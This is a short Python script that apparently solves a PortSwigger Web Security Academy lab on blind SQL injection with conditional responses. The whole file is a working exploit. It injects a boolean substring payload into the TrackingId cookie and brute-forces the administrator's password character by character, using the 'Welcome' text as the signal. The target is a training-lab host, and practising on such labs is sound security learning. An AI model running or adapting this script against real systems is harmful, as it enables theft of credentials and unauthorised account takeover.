# PortSwigger
# SQL injection: Blind SQL injection with conditional responses
# woanmeo11

from requests import get
from string import ascii_lowercase, digits

url = 'https://ac9f1f0d1e29089c80fd0cfb000500c2.web-security-academy.net'
cookies = {
    'session': 'xObaBIesex3DMqwmNUwGBY4jTZ6QYSMm',
    'TrackingId': ''
}

passwd = ''

stop = False
while not stop:
    stop = True
    for c in ascii_lowercase + digits:
        print(c)

        payload = "wFa86nivp7x5KSPa" + f"' and substring((select password from users where username='administrator'), {len(passwd) + 1}, 1) = '{c}"
        cookies['TrackingId'] = payload
        r = get(url, cookies=cookies)

        if 'Welcome' in r.text:
            stop = False
            passwd += c
            print('found:', passwd)
            break

print('found:', passwd)
